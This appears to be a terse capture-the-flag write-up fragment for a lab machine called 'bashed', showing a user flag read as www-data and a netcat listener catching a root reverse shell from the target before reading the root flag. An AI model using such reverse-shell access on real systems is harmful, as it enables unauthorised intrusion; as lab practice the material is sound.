# user flag
```
www-data@bashed:/home# cat arrexel/user.txt
6b<SNIP>1ea
```

# root flag
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.68] 50570
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
783<SNIP>0f
```
